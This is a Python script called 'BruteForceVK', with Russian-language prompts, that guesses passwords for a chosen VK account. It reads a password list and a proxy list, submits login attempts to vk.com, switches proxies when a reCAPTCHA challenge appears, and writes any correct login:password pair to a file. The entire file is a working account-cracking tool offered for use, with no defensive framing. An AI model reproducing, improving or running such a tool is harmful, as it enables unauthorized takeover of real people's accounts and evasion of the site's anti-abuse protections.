import lxml.html
import requests
from colorama import init, Fore
import time
init()

print('BruteForceVK')
print('Выберите тип используемых прокси')
print('1. HTTPS')
print('2. SOCKS4')
print('3. SOCKS5')
typepr = str(input('> '))
print('BruteForceVK')
print('Введите логин')
login = str(input('> '))
print('BruteForceVK')
print('Введите прокси-лист(он должен быть в одной папке с программой)')
prx = str(input('> '))
lstprx = open(prx, 'r')
rdprx = lstprx.readlines()
print('BruteForceVK')
print('Введите желаемый тайм-аут прокси в секундах')
out = str(input('> '))
print('BruteForceVK')
print('Введите лист с паролями(он должен быть в одной папке с программой)')
passlst = str(input('> '))
passlist = open(passlst, 'r')
pwd = passlist.readlines()

for proxy in rdprx:
    for password in pwd:
        url = 'https://vk.com/'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',            
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding':'identity',
        'accept-language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection':'keep-alive',
        'DNT':'1',
        'CF-Request-ID':'0475e3fb8e00007b237da5e200000001',
        'requests':''
}
        session = requests.session()
        data = session.get(url, headers=headers)
        page = lxml.html.fromstring(data.content)
        form = page.forms[0]
        form.fields['email'] = login
        form.fields['pass'] = password
        response = session.post(form.action, data=form.form_values())
        if 'onLoginDone' in response.text:
            print(Fore.GREEN + password + ' Этот пароль является верным')
            passlist.close()
            done = open('vk.txt', 'a')
            done.write(login + ':' + password)
            done.close()
            time.sleep(30)
            exit()
        elif 'onLoginFailed' in response.text:
            print(Fore.RED + password + ' Пароль неверный')
            j = open('vkk.txt', 'w')
            j.write(response.text)
            j.close()
        elif 'onLoginReCaptcha' in response.text:
            if typepr == '1':
                proxiez = {'https' : 'https://' + proxy}
            elif typepr == '2':
                proxiez = {'https': 'socks4://' + proxy}
            elif typepr == '3':
            	proxiez = {'https': 'socks5://' + proxy}
            for proxy in rdprx:
                try:
                    sss = session.post(form.action, data=form.form_values(), proxies = proxiez, timeout = out)
                    if 'onLoginDone' in sss.text:
                        print(Fore.GREEN + password + ' Этот пароль является верным')
                        passlist.close()
                        dox = open('vk.txt', 'a')
                        dox.write(login + ':' + password)
                        dox.close()
                        time.sleep(30)
                        exit()
                    elif 'onLoginFailed' in sss.text:
                        print(Fore.RED + password + ' Пароль неверный')
                        jx = open('vkk.txt', 'w')
                        jx.write(sss.text)
                        jx.close()
                    elif 'onLoginReCaptcha' in sss.text:
                        print(proxy + ' этот прокси не рабочий')
                    else:
                        print('Ошибка')
                except:
                    print(proxy + ' этот прокси не рабочий')
                    pass
passlist.close()
input()
